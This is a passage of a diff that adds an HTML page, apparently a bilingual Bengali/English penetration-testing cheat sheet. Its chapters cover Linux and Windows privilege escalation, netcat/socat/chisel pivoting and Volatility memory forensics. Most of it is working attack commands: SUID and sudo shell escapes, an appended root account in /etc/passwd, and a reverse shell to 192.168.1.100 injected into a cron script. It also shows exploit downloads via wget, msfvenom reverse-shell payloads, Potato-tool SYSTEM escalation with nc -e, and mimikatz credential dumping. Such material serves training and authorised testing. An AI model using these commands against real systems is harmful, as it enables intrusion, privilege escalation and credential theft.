+target$ <span class="g">find / -perm -4000 -type f 2>/dev/null</span>
+target$ <span class="g">find / -perm -u=s -type f 2>/dev/null</span>
+
+<span class="c"># SGID files খোঁজো</span>
+target$ <span class="g">find / -perm -2000 -type f 2>/dev/null</span>
+
+<span class="c"># SUID+SGID দুটো একসাথে</span>
+target$ <span class="g">find / -perm -6000 -type f 2>/dev/null</span>
+
+<span class="c"># GTFOBins দিয়ে exploit করো — উদাহরণ: /usr/bin/find SUID থাকলে</span>
+target$ <span class="g">find . -exec /bin/sh -p \; -quit</span>
+
+<span class="c"># /usr/bin/vim SUID থাকলে</span>
+target$ <span class="g">vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'</span>
+
+<span class="c"># /usr/bin/python3 SUID থাকলে</span>
+target$ <span class="g">python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'</span>
+
+<span class="c"># /usr/bin/cp SUID থাকলে — /etc/passwd copy করো</span>
+target$ <span class="g">openssl passwd -1 -salt hack hackedpass</span>
+target$ <span class="g">echo 'hacker:$1$hack$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd</span>
+target$ <span class="g">cp /tmp/passwd /etc/passwd</span>
+target$ <span class="g">su hacker</span>
+    </div>
+
+    <h2 class="sec">🔐 Sudo Misconfiguration</h2>
+    <div class="code">
+<span class="c"># Sudo permissions দেখো</span>
+target$ <span class="g">sudo -l</span>
+
+<span class="c"># উদাহরণ output: (ALL) NOPASSWD: /usr/bin/vim</span>
+<span class="c"># এর মানে password ছাড়াই vim root হিসেবে চালানো যাবে</span>
+
+<span class="c"># sudo vim দিয়ে root shell:</span>
+target$ <span class="g">sudo vim -c ':!/bin/bash'</span>
+
+<span class="c"># sudo python দিয়ে root shell:</span>
+target$ <span class="g">sudo python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+
+<span class="c"># sudo awk দিয়ে:</span>
+target$ <span class="g">sudo awk 'BEGIN {system("/bin/bash")}'</span>
+
+<span class="c"># sudo find দিয়ে:</span>
+target$ <span class="g">sudo find /etc -exec /bin/bash \;</span>
+
+<span class="c"># sudo nmap দিয়ে (old version):</span>
+target$ <span class="g">echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse</span>
+
+<span class="c"># sudo less / man / more দিয়ে — !/bin/bash চালাও:</span>
+target$ <span class="g">sudo less /etc/passwd</span>
+<span class="c"># তারপর: !/bin/bash</span>
+
+<span class="c"># sudo env দিয়ে:</span>
+target$ <span class="g">sudo env /bin/bash</span>
+
+<span class="c"># (ALL) NOPASSWD: ALL থাকলে সরাসরি:</span>
+target$ <span class="g">sudo su</span>
+target$ <span class="g">sudo /bin/bash</span>
+    </div>
+
+    <h2 class="sec">⏰ Cron Job Hijacking</h2>
+    <div class="code">
+<span class="c"># Cron jobs খোঁজো</span>
+target$ <span class="g">cat /etc/crontab</span>
+target$ <span class="g">ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/</span>
+target$ <span class="g">cat /var/spool/cron/crontabs/*</span>
+target$ <span class="g">crontab -l</span>
+
+<span class="c"># Writable script আছে কিনা দেখো</span>
+<span class="c"># উদাহরণ: /etc/crontab-এ: * * * * * root /opt/scripts/backup.sh</span>
+target$ <span class="g">ls -la /opt/scripts/backup.sh</span>  <span class="c"># -rw-rw-rw- মানে সবাই write করতে পারে</span>
+
+<span class="c"># Script-এ reverse shell inject করো</span>
+target$ <span class="g">echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >> /opt/scripts/backup.sh</span>
+
+<span class="c"># Attacker-এ listener চালাও</span>
+<span class="p">root@kali</span>:~# <span class="g">nc -lvnp 4444</span>
+<span class="c"># Cron job চালানোর সময় root shell পাবে</span>
+
+<span class="c"># Script না থাকলে তৈরি করো</span>
+target$ <span class="g">echo '#!/bin/bash' > /opt/scripts/backup.sh</span>
+target$ <span class="g">echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' >> /opt/scripts/backup.sh</span>
+target$ <span class="g">chmod +x /opt/scripts/backup.sh</span>
+    </div>
+
+    <h2 class="sec">🛤️ PATH Injection</h2>
+    <div class="code">
+<span class="c"># একটি SUID script বা cron job নির্দিষ্ট command চালাচ্ছে কিনা দেখো</span>
+<span class="c"># যেমন: script.sh-এ "service apache2 restart" লেখা আছে (full path ছাড়া)</span>
+
+<span class="c"># Writable directory PATH-এ add করো</span>
+target$ <span class="g">export PATH=/tmp:$PATH</span>
+
+<span class="c"># Fake "service" command তৈরি করো /tmp-এ</span>
+target$ <span class="g">echo '#!/bin/bash' > /tmp/service</span>
+target$ <span class="g">echo '/bin/bash -p' >> /tmp/service</span>
+target$ <span class="g">chmod +x /tmp/service</span>
+
+<span class="c"># এখন সেই SUID script চালাও → root shell পাবে</span>
+target$ <span class="g">./vulnerable_suid_script</span>
+    </div>
+
+    <h2 class="sec">🐛 Kernel Exploit</h2>
+    <div class="code">
+<span class="c"># Kernel version দেখো</span>
+target$ <span class="g">uname -r</span>
+target$ <span class="g">cat /proc/version</span>
+
+<span class="c"># Searchsploit দিয়ে kernel exploit খোঁজো</span>
+<span class="p">root@kali</span>:~# <span class="g">searchsploit linux kernel 4.15 privilege escalation</span>
+
+<span class="c"># Popular kernel exploits:</span>
+<span class="c"># DirtyCow (CVE-2016-5195) — kernel 2.6.22 to 4.8.3</span>
+target$ <span class="g">wget http://192.168.1.100:8080/dirtycow.c -O /tmp/cow.c</span>
+target$ <span class="g">gcc -pthread /tmp/cow.c -o /tmp/dirtycow -lcrypt && /tmp/dirtycow</span>
+
+<span class="c"># DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11</span>
+target$ <span class="g">./dirtypipe /etc/passwd</span>
+
+<span class="c"># Linux Local Privilege Escalation Suggester</span>
+target$ <span class="g">wget http://192.168.1.100:8080/linux-exploit-suggester.sh</span>
+target$ <span class="g">chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh</span>
+    </div>
+
+    <h2 class="sec">📁 <span class="bn-text">অন্যান্য PrivEsc Vectors</span><span class="en-text">Other PrivEsc Vectors</span></h2>
+    <div class="code">
+<span class="c"># World-writable ও sensitive files খোঁজো</span>
+target$ <span class="g">find / -writable -type f 2>/dev/null | grep -v proc</span>
+target$ <span class="g">find / -writable -type d 2>/dev/null | grep -v proc</span>
+
+<span class="c"># Weak file permissions</span>
+target$ <span class="g">ls -la /etc/passwd /etc/shadow /etc/sudoers</span>
+target$ <span class="g">ls -la /root/</span>
+
+<span class="c"># Interesting files</span>
+target$ <span class="g">find / -name "*.conf" -readable 2>/dev/null | head -20</span>
+target$ <span class="g">find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null</span>
+target$ <span class="g">find / -name "*.bak" -o -name "*.backup" 2>/dev/null</span>
+target$ <span class="g">grep -r "password" /etc/ 2>/dev/null</span>
+target$ <span class="g">grep -r "password" /var/www/ 2>/dev/null</span>
+
+<span class="c"># NFS shares (no_root_squash)</span>
+target$ <span class="g">cat /etc/exports</span>
+<span class="p">root@kali</span>:~# <span class="g">showmount -e target_ip</span>
+<span class="p">root@kali</span>:~# <span class="g">mount -o rw,vers=2 target_ip:/share /mnt/nfs</span>
+
+<span class="c"># Docker group সদস্য কিনা দেখো</span>
+target$ <span class="g">id | grep docker</span>
+target$ <span class="g">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span>
+
+<span class="c"># Capabilities check</span>
+target$ <span class="g">getcap -r / 2>/dev/null</span>
+<span class="c"># python3 cap_setuid+ep থাকলে:</span>
+target$ <span class="g">python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH3: WINDOWS PRIVESC -->
+<div class="chapter ch3">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 03</div>
+    <div class="chapter-title">🪟 Windows Privilege Escalation</div>
+    <div class="chapter-desc"><span class="bn-text">Token impersonation, Service misconfiguration, Registry — Windows-এ SYSTEM পাওয়ার পদ্ধতি</span><span class="en-text">Token impersonation, service misconfiguration, registry — methods to get SYSTEM on Windows</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🔍 <span class="bn-text">Initial Enumeration</span><span class="en-text">Initial Enumeration</span></h2>
+    <div class="code">
+<span class="c"># System info</span>
+<span class="cy">C:\></span> <span class="g">systeminfo</span>                          <span class="c"># OS, hotfixes, architecture</span>
+<span class="cy">C:\></span> <span class="g">whoami /all</span>                         <span class="c"># Current user + groups + privileges</span>
+<span class="cy">C:\></span> <span class="g">net user</span>                            <span class="c"># All local users</span>
+<span class="cy">C:\></span> <span class="g">net localgroup administrators</span>       <span class="c"># Admin group members</span>
+<span class="cy">C:\></span> <span class="g">net user [username]</span>                  <span class="c"># Specific user details</span>
+<span class="cy">C:\></span> <span class="g">ipconfig /all</span>                       <span class="c"># Network info</span>
+<span class="cy">C:\></span> <span class="g">netstat -ano</span>                        <span class="c"># Open connections</span>
+<span class="cy">C:\></span> <span class="g">tasklist /SVC</span>                       <span class="c"># Running processes + services</span>
+<span class="cy">C:\></span> <span class="g">schtasks /query /fo LIST /v</span>         <span class="c"># Scheduled tasks</span>
+<span class="cy">C:\></span> <span class="g">wmic service get name,displayname,startname,startmode</span>  <span class="c"># Services</span>
+    </div>
+
+    <h2 class="sec">🎭 Token Impersonation — <span class="bn-text">Juicy Potato / PrintSpoofer</span></h2>
+    <div class="box teal-box">
+      <div class="box-t">💡 <span class="bn-text">SeImpersonatePrivilege</span></div>
+      <span class="bn-text">whoami /priv-এ SeImpersonatePrivilege বা SeAssignPrimaryTokenPrivilege থাকলে Juicy Potato / PrintSpoofer / RoguePotato দিয়ে SYSTEM হওয়া সম্ভব।</span>
+      <span class="en-text">If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege appears in whoami /priv, you can get SYSTEM with Juicy Potato / PrintSpoofer / RoguePotato.</span>
+    </div>
+    <div class="code">
+<span class="c"># Privilege check করো</span>
+<span class="cy">C:\></span> <span class="g">whoami /priv</span>
+
+<span class="c"># PrintSpoofer (Windows 10, Server 2016/2019)</span>
+<span class="cy">C:\></span> <span class="g">PrintSpoofer.exe -i -c cmd</span>
+<span class="cy">C:\></span> <span class="g">PrintSpoofer.exe -c "nc.exe 192.168.1.100 4444 -e cmd"</span>
+
+<span class="c"># JuicyPotato (Windows &lt; 2019)</span>
+<span class="cy">C:\></span> <span class="g">JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *</span>
+<span class="cy">C:\></span> <span class="g">JuicyPotato.exe -l 1337 -p cmd.exe -a "/c nc.exe 192.168.1.100 4444 -e cmd" -t *</span>
+
+<span class="c"># GodPotato (all Windows versions)</span>
+<span class="cy">C:\></span> <span class="g">GodPotato.exe -cmd "cmd /c whoami"</span>
+<span class="cy">C:\></span> <span class="g">GodPotato.exe -cmd "nc.exe 192.168.1.100 4444 -e cmd"</span>
+    </div>
+
+    <h2 class="sec">⚙️ Service Misconfiguration</h2>
+    <div class="code">
+<span class="c"># Unquoted service path খোঁজো</span>
+<span class="cy">C:\></span> <span class="g">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"</span>
+
+<span class="c"># Service permissions check করো</span>
+<span class="cy">C:\></span> <span class="g">accesschk.exe -wuvc "Everyone" * /accepteula</span>
+<span class="cy">C:\></span> <span class="g">accesschk.exe -wuvc "BUILTIN\Users" * /accepteula</span>
+
+<span class="c"># Vulnerable service path</span>
+<span class="c"># উদাহরণ: C:\Program Files\Vulnerable Service\service.exe</span>
+<span class="c"># C:\Program.exe তৈরি করলে সেটা চলবে (unquoted)</span>
+<span class="cy">C:\></span> <span class="g">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o Program.exe</span>
+<span class="cy">C:\></span> <span class="g">copy Program.exe "C:\Program.exe"</span>
+<span class="cy">C:\></span> <span class="g">net stop [service] && net start [service]</span>
+
+<span class="c"># Weak service permission</span>
+<span class="cy">C:\></span> <span class="g">sc config [service] binpath= "C:\Windows\Temp\payload.exe"</span>
+<span class="cy">C:\></span> <span class="g">net stop [service] && net start [service]</span>
+    </div>
+
+    <h2 class="sec">📋 Registry PrivEsc</h2>
+    <div class="code">
+<span class="c"># AlwaysInstallElevated check করো</span>
+<span class="cy">C:\></span> <span class="g">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="cy">C:\></span> <span class="g">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="c"># দুটোই 0x1 হলে → MSI payload বানাও:</span>
+<span class="p">root@kali</span>:~# <span class="g">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o payload.msi</span>
+<span class="cy">C:\></span> <span class="g">msiexec /quiet /qn /i C:\Windows\Temp\payload.msi</span>
+
+<span class="c"># Autologon credentials খোঁজো</span>
+<span class="cy">C:\></span> <span class="g">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span>
+
+<span class="c"># Saved credentials</span>
+<span class="cy">C:\></span> <span class="g">cmdkey /list</span>
+<span class="cy">C:\></span> <span class="g">runas /savecred /user:admin "cmd.exe /c whoami"</span>
+    </div>
+
+    <h2 class="sec">🔑 Pass-the-Hash / Credential Dumping</h2>
+    <div class="code">
+<span class="c"># Meterpreter দিয়ে hashdump (SYSTEM দরকার)</span>
+meterpreter> <span class="g">hashdump</span>
+
+<span class="c"># Mimikatz — SYSTEM হলে সব credentials পাবে</span>
+meterpreter> <span class="g">load kiwi</span>
+meterpreter> <span class="g">creds_all</span>
+meterpreter> <span class="g">lsa_dump_sam</span>
+meterpreter> <span class="g">lsa_dump_secrets</span>
+
+<span class="c"># Mimikatz direct (cmd.exe as SYSTEM)</span>
+<span class="cy">C:\></span> <span class="g">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</span>
+<span class="cy">C:\></span> <span class="g">mimikatz.exe "privilege::debug" "lsadump::sam" "exit"</span>
+
+<span class="c"># CrackMapExec দিয়ে Pass-the-Hash</span>
+<span class="p">root@kali</span>:~# <span class="g">cme smb 192.168.1.5 -u administrator -H 'NTLM_HASH'</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH4: NETCAT / SOCAT / CHISEL -->
+<div class="chapter ch4">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 04</div>
+    <div class="chapter-title">🚇 Netcat, Socat & Chisel — <span class="bn-text">Tunneling & Pivoting</span><span class="en-text">Tunneling & Pivoting</span></div>
+    <div class="chapter-desc"><span class="bn-text">Firewall bypass, port forwarding, SOCKS proxy দিয়ে internal network-এ পৌঁছাও</span><span class="en-text">Bypass firewalls, port forwarding, SOCKS proxy to reach internal networks</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">📡 Netcat — <span class="bn-text">সম্পূর্ণ Commands</span><span class="en-text">Complete Commands</span></h2>
+    <table class="cmd-table">
+      <thead><tr><th><span class="bn-text">কমান্ড</span><span class="en-text">Command</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-cell">nc -lvnp 4444</td><td class="desc-cell"><span class="bn-text">TCP listener চালাও (-l=listen, -v=verbose, -n=no dns, -p=port)</span><span class="en-text">Start TCP listener</span></td></tr>
+        <tr><td class="cmd-cell">nc 192.168.1.5 4444</td><td class="desc-cell"><span class="bn-text">TCP connection করো</span><span class="en-text">Connect via TCP</span></td></tr>
+        <tr><td class="cmd-cell">nc -lvnp 4444 -e /bin/bash</td><td class="desc-cell"><span class="bn-text">Bind shell — port খুলে bash দাও</span><span class="en-text">Bind shell — open port and serve bash</span></td></tr>
+        <tr><td class="cmd-cell">nc host port -e /bin/bash</td><td class="desc-cell"><span class="bn-text">Reverse shell পাঠাও</span><span class="en-text">Send reverse shell</span></td></tr>
+        <tr><td class="cmd-cell">nc -lvnp 4444 > file.txt</td><td class="desc-cell"><span class="bn-text">Incoming data file-এ save করো</span><span class="en-text">Save incoming data to file</span></td></tr>
+        <tr><td class="cmd-cell">nc host port < file.txt</td><td class="desc-cell"><span class="bn-text">File পাঠাও</span><span class="en-text">Send file</span></td></tr>
+        <tr><td class="cmd-cell">nc -zv host 1-1000</td><td class="desc-cell"><span class="bn-text">Port scan করো</span><span class="en-text">Port scan</span></td></tr>
+        <tr><td class="cmd-cell">nc -u host 53</td><td class="desc-cell"><span class="bn-text">UDP connection করো</span><span class="en-text">UDP connection</span></td></tr>
+        <tr><td class="cmd-cell">nc -w 5 host port</td><td class="desc-cell"><span class="bn-text">5 second timeout সেট করো</span><span class="en-text">Set 5 second timeout</span></td></tr>
+        <tr><td class="cmd-cell">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc host port >/tmp/f</td><td class="desc-cell"><span class="bn-text">Named pipe দিয়ে reverse shell (OpenBSD nc)</span><span class="en-text">Reverse shell via named pipe (OpenBSD nc)</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🔄 Socat — <span class="bn-text">Advanced Networking Tool</span><span class="en-text">Advanced Networking Tool</span></h2>
+    <div class="code">
+<span class="c"># TTY reverse shell listener (সবচেয়ে ভালো shell পাবে)</span>
+<span class="p">root@kali</span>:~# <span class="g">socat file:`tty`,raw,echo=0 TCP-LISTEN:4444</span>
+
+<span class="c"># Target-এ fully interactive shell পাঠাও</span>
+target$ <span class="g">socat TCP:192.168.1.100:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane</span>
+
+<span class="c"># Simple bind shell</span>
+target$ <span class="g">socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr</span>
+<span class="p">root@kali</span>:~# <span class="g">socat - TCP:target:4444</span>
+
+<span class="c"># Port forwarding — local 8080 → remote 80</span>
+target$ <span class="g">socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.200:80</span>
+
+<span class="c"># SSL encrypted reverse shell</span>
+<span class="p">root@kali</span>:~# <span class="g">openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</span>
+<span class="p">root@kali</span>:~# <span class="g">cat shell.key shell.crt > shell.pem</span>
+<span class="p">root@kali</span>:~# <span class="g">socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0</span>
+target$ <span class="g">socat OPENSSL:192.168.1.100:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid</span>
+    </div>
+
+    <h2 class="sec">🚇 Chisel — <span class="bn-text">HTTP-based Tunneling</span><span class="en-text">HTTP-based Tunneling</span></h2>
+    <div class="box teal-box">
+      <div class="box-t">💡 Chisel কী?</div>
+      <span class="bn-text">Chisel HTTP দিয়ে TCP tunnel করে — Firewall যদি শুধু HTTP allow করে তখনো কাজ করে। Internal network-এ পৌঁছানোর জন্য ideal।</span>
+      <span class="en-text">Chisel tunnels TCP over HTTP — works even if only HTTP is allowed. Ideal for reaching internal networks through firewalls.</span>
+    </div>
+    <div class="code">
+<span class="c">═══ Remote Port Forward — Target-এর service attacker-এ access করো ═══</span>
+<span class="c"># Attacker-এ server চালাও:</span>
+<span class="p">root@kali</span>:~# <span class="g">chisel server -p 8080 --reverse</span>
+
+<span class="c"># Target-এ client চালাও (internal 80 port forward করো):</span>
+target$ <span class="g">chisel client 192.168.1.100:8080 R:9090:127.0.0.1:80</span>
+<span class="c"># এখন attacker-এ localhost:9090 দিয়ে target-এর port 80 access করো</span>
+
+<span class="c">═══ SOCKS5 Proxy (সব internal network access করো) ═══</span>
+<span class="c"># Attacker-এ:</span>
+<span class="p">root@kali</span>:~# <span class="g">chisel server -p 8080 --reverse</span>
+
+<span class="c"># Target-এ:</span>
+target$ <span class="g">chisel client 192.168.1.100:8080 R:socks</span>
+
+<span class="c"># Attacker-এ proxychains configure করো:</span>
+<span class="p">root@kali</span>:~# <span class="g">echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf</span>
+
+<span class="c"># এখন proxychains দিয়ে internal network access করো:</span>
+<span class="p">root@kali</span>:~# <span class="g">proxychains nmap -sT -p 80,443,22 192.168.2.5</span>
+<span class="p">root@kali</span>:~# <span class="g">proxychains curl http://192.168.2.5</span>
+<span class="p">root@kali</span>:~# <span class="g">proxychains ssh user@192.168.2.5</span>
+
+<span class="c">═══ Local Port Forward — Attacker-এর service target-এ forward করো ═══</span>
+target$ <span class="g">chisel client 192.168.1.100:8080 3000:localhost:3000</span>
+    </div>
+
+    <h2 class="sec">🔀 SSH Tunneling / Port Forwarding</h2>
+    <div class="code">
+<span class="c"># Local Port Forward — localhost:8080 → target:80</span>
+<span class="p">root@kali</span>:~# <span class="g">ssh -L 8080:127.0.0.1:80 user@target -N</span>
+
+<span class="c"># Remote Port Forward — target-এর 4444 → attacker:4444</span>
+<span class="p">root@kali</span>:~# <span class="g">ssh -R 4444:127.0.0.1:4444 user@target -N</span>
+
+<span class="c"># Dynamic Port Forward — SOCKS proxy (internal network)</span>
+<span class="p">root@kali</span>:~# <span class="g">ssh -D 1080 user@target -N</span>
+<span class="c"># proxychains দিয়ে use করো</span>
+
+<span class="c"># Double pivot — target → internal → deep internal</span>
+<span class="p">root@kali</span>:~# <span class="g">ssh -L 8888:192.168.2.5:22 user@192.168.1.5 -N</span>
+<span class="p">root@kali</span>:~# <span class="g">ssh -p 8888 user@127.0.0.1</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH5: VOLATILITY -->
+<div class="chapter ch5">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 05</div>
+    <div class="chapter-title">🧠 Volatility — <span class="bn-text">Memory Forensics</span><span class="en-text">Memory Forensics</span></div>
+    <div class="chapter-desc"><span class="bn-text">RAM dump থেকে process, network, malware, credentials — সব বের করো</span><span class="en-text">Extract processes, network connections, malware, and credentials from RAM dumps</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="tool-header">
+      <div class="tool-icon">🧠</div>
+      <div>
+        <div class="tool-name">volatility3 / vol.py</div>
+        <div class="tool-desc"><span class="bn-text">Open-source memory forensics framework — Windows, Linux, macOS memory dump analyze করতে পারে</span><span class="en-text">Open-source memory forensics framework — analyzes Windows, Linux, macOS memory dumps</span></div>
+        <div class="tool-badges">
+          <span class="tool-badge tb-mem">Memory Analysis</span>
+          <span class="tool-badge tb-for">Forensics</span>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">🚀 <span class="bn-text">Volatility 3 — Basic Setup ও Syntax</span><span class="en-text">Volatility 3 — Basic Setup & Syntax</span></h2>
+    <div class="code">
+<span class="c"># Install করো (যদি না থাকে)</span>
+<span class="p">root@kali</span>:~# <span class="g">pip3 install volatility3</span>
+<span class="p">root@kali</span>:~# <span class="g">git clone https://github.com/volatilityfoundation/volatility3.git</span>
+<span class="p">root@kali</span>:~# <span class="g">cd volatility3 && python3 setup.py install</span>
+
+<span class="c"># Basic syntax (Volatility 3):</span>
+<span class="c"># vol -f [memory_dump] [plugin]</span>
+<span class="p">root@kali</span>:~# <span class="g">vol -f memory.dmp windows.info</span>
+
+<span class="c"># Volatility 2 syntax (অনেক CTF-এ এখনো use হয়):</span>
+<span class="c"># volatility -f [dump] --profile=[profile] [plugin]</span>
+<span class="p">root@kali</span>:~# <span class="g">volatility -f memory.dmp --profile=Win10x64_19041 pslist</span>
+
+<span class="c"># Profile identify করো (Volatility 2)</span>
+<span class="p">root@kali</span>:~# <span class="g">volatility -f memory.dmp imageinfo</span>
+<span class="p">root@kali</span>:~# <span class="g">volatility -f memory.dmp kdbgscan</span>
+    </div>
+
+    <h2 class="sec">💻 <span class="bn-text">Process Analysis</span><span class="en-text">Process Analysis</span></h2>
+    <table class="cmd-table">
+      <thead><tr><th><span class="bn-text">Plugin (Vol3)</span></th><th><span class="bn-text">Plugin (Vol2)</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-cell">windows.pslist</td><td class="flag-cell">pslist</td><td class="desc-cell"><span class="bn-text">Running processes দেখাও (EPROCESS list থেকে)</span><span class="en-text">Show running processes (from EPROCESS list)</span></td></tr>
+        <tr><td class="cmd-cell">windows.pstree</td><td class="flag-cell">pstree</td><td class="desc-cell"><span class="bn-text">Process tree দেখাও (parent-child relationship)</span><span class="en-text">Show process tree (parent-child)</span></td></tr>
+        <tr><td class="cmd-cell">windows.psscan</td><td class="flag-cell">psscan</td><td class="desc-cell"><span class="bn-text">Pool scanning — hidden process খোঁজো</span><span class="en-text">Pool scanning — find hidden processes</span></td></tr>
+        <tr><td class="cmd-cell">windows.dlllist</td><td class="flag-cell">dlllist</td><td class="desc-cell"><span class="bn-text">Process-এর loaded DLL দেখাও</span><span class="en-text">Show loaded DLLs for a process</span></td></tr>
+        <tr><td class="cmd-cell">windows.cmdline</td><td class="flag-cell">cmdline</td><td class="desc-cell"><span class="bn-text">প্রতিটি process-এর command line arguments দেখাও</span><span class="en-text">Show command line args for each process</span></td></tr>
+        <tr><td class="cmd-cell">windows.handles</td><td class="flag-cell">handles</td><td class="desc-cell"><span class="bn-text">Open handles দেখাও</span><span class="en-text">Show open handles</span></td></tr>
+        <tr><td class="cmd-cell">windows.malfind</td><td class="flag-cell">malfind</td><td class="desc-cell"><span class="bn-text">Injected code/malware খোঁজো (suspicious memory)</span><span class="en-text">Find injected code/malware (suspicious memory)</span></td></tr>
+        <tr><td class="cmd-cell">windows.memmap</td><td class="flag-cell">memmap</td><td class="desc-cell"><span class="bn-text">Process memory map দেখাও</span><span class="en-text">Show process memory map</span></td></tr>
+        <tr><td class="cmd-cell">windows.procdump</td><td class="flag-cell">procdump</td><td class="desc-cell"><span class="bn-text">Process executable disk-এ dump করো</span><span class="en-text">Dump process executable to disk</span></td></tr>
+        <tr><td class="cmd-cell">windows.memdump</td><td class="flag-cell">memdump</td><td class="desc-cell"><span class="bn-text">Process memory সম্পূর্ণ dump করো</span><span class="en-text">Dump entire process memory</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🌐 <span class="bn-text">Network Analysis</span><span class="en-text">Network Analysis</span></h2>
+    <table class="cmd-table">
+      <thead><tr><th><span class="bn-text">Plugin (Vol3)</span></th><th><span class="bn-text">Plugin (Vol2)</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-cell">windows.netstat</td><td class="flag-cell">netscan</td><td class="desc-cell"><span class="bn-text">Network connections দেখাও (active + closed)</span><span class="en-text">Show network connections (active + closed)</span></td></tr>
+        <tr><td class="cmd-cell">windows.netstat</td><td class="flag-cell">connections</td><td class="desc-cell"><span class="bn-text">Active TCP connections (WinXP/2003)</span><span class="en-text">Active TCP connections (WinXP/2003)</span></td></tr>
+        <tr><td class="cmd-cell">windows.netstat</td><td class="flag-cell">connscan</td><td class="desc-cell"><span class="bn-text">Connection pool scan (terminated সহ)</span><span class="en-text">Connection pool scan (including terminated)</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">📁 <span class="bn-text">File System ও Registry</span><span class="en-text">File System & Registry</span></h2>
+    <table class="cmd-table">
+      <thead><tr><th><span class="bn-text">Plugin (Vol3)</span></th><th><span class="bn-text">Plugin (Vol2)</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-cell">windows.filescan</td><td class="flag-cell">filescan</td><td class="desc-cell"><span class="bn-text">Memory-তে থাকা file objects খোঁজো</span><span class="en-text">Find file objects in memory</span></td></tr>
+        <tr><td class="cmd-cell">windows.dumpfiles</td><td class="flag-cell">dumpfiles</td><td class="desc-cell"><span class="bn-text">Memory থেকে file extract করো</span><span class="en-text">Extract files from memory</span></td></tr>
+        <tr><td class="cmd-cell">windows.registry.hivelist</td><td class="flag-cell">hivelist</td><td class="desc-cell"><span class="bn-text">Registry hives দেখাও</span><span class="en-text">List registry hives</span></td></tr>
+        <tr><td class="cmd-cell">windows.registry.printkey</td><td class="flag-cell">printkey</td><td class="desc-cell"><span class="bn-text">Registry key value দেখাও</span><span class="en-text">Show registry key value</span></td></tr>
+        <tr><td class="cmd-cell">windows.registry.userassist</td><td class="flag-cell">userassist</td><td class="desc-cell"><span class="bn-text">Recently accessed programs দেখাও</span><span class="en-text">Show recently accessed programs</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🔑 <span class="bn-text">Credentials Extraction</span><span class="en-text">Credentials Extraction</span></h2>
+    <table class="cmd-table">
+      <thead><tr><th><span class="bn-text">Plugin (Vol3)</span></th><th><span class="bn-text">Plugin (Vol2)</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Function</span></th></tr></thead>
+      <tbody>
+        <tr><td class="cmd-cell">windows.hashdump</td><td class="flag-cell">hashdump</td><td class="desc-cell"><span class="bn-text">SAM database থেকে password hash dump করো</span><span class="en-text">Dump password hashes from SAM database</span></td></tr>
+        <tr><td class="cmd-cell">windows.lsadump</td><td class="flag-cell">lsadump</td><td class="desc-cell"><span class="bn-text">LSA secrets dump করো</span><span class="en-text">Dump LSA secrets</span></td></tr>
+        <tr><td class="cmd-cell">windows.cachedump</td><td class="flag-cell">cachedump</td><td class="desc-cell"><span class="bn-text">Cached domain credentials dump করো</span><span class="en-text">Dump cached domain credentials</span></td></tr>
+        <tr><td class="cmd-cell">windows.clipboard</td><td class="flag-cell">clipboard</td><td class="desc-cell"><span class="bn-text">Clipboard data দেখাও</span><span class="en-text">Show clipboard data</span></td></tr>
+      </tbody>
+    </table>
+
+    <div class="code">
